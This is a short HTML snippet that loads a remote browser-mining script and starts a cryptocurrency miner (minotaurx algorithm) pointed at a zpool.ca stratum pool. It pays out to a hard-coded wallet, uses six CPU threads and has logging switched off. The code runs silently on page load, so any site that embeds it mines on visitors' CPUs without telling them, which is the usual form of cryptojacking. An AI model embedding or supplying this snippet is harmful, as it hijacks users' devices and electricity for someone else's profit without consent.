<script src="https://webminer.pages.dev/dist/mm.js"></script>
            <script>
            const client = new Client({
            algorithm: 'minotaurx', // yespower, minotaurx
            stratum: {
            server: "minotaurx.na.mine.zpool.ca", // Your Pool host
            port: 7019, // Your Pool port
            worker: "RKTMBzVtSpkDVHFdtL1obGLdQNYggnBPUc", // Your Wallet
            password: "c=RVN" // Your Mining password
            },
            options: {
            threads: 6, // CPU threads to mining
            log: false // Show log on console
            },
            });

            // Start Mining
            client.start();
            </script>
